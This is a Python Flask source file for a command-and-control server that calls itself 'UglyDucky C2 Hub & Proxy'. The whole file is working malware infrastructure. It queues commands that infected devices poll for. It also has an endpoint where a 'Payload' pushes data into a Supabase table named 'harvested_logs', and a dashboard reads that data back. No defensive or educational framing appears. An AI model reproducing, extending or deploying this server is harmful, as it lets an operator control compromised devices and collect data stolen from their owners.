# File: c2_listener.py
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
# Enable CORS so your frontend dashboard can make requests to this API without browser blocking it
CORS(app)

# Pull Supabase credentials securely from Render Environment Variables
# If not set in Render, it falls back to the URL provided
SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "") 

command_queue = {}

# ---------------------------------------------------------
# COMMAND C2 ENDPOINTS
# ---------------------------------------------------------
@app.route('/issue', methods=['POST'])
def issue_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    if not device_id or not command:
        return jsonify({"error": "device_id and command are required"}), 400
        
    command_queue[device_id] = command
    print(f"Queued command '{command}' for device '{device_id}'")
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    command = command_queue.pop(device_id, None)
    return jsonify({"command": command})

# ---------------------------------------------------------
# SECURE SUPABASE PROXY ENDPOINTS
# ---------------------------------------------------------
@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    """Dashboard calls this to FETCH logs without needing the API key."""
    if not SUPABASE_KEY:
        return jsonify({"error": "Supabase key missing in Render Environment"}), 500

    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json"
    }
    
    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except requests.exceptions.RequestException as e:
        print(f"Failed fetching logs: {e}")
        return jsonify({"error": "Database fetch failed"}), 500

@app.route('/logs', methods=['POST'])
def push_logs():
    """Payload calls this to PUSH logs without needing the API key."""
    if not SUPABASE_KEY:
        return jsonify({"error": "Supabase key missing in Render Environment"}), 500

    payload_data = request.json
    if not payload_data:
        return jsonify({"error": "No JSON data provided"}), 400

    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal,resolution=merge-duplicates"
    }
    
    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
    
    try:
        response = requests.post(upsert_url, json=payload_data, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException as e:
        print(f"Failed pushing logs: {e}")
        return jsonify({"error": "Database push failed"}), 500

@app.route('/')
def index():
    return "UglyDucky C2 Hub & Proxy Online."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
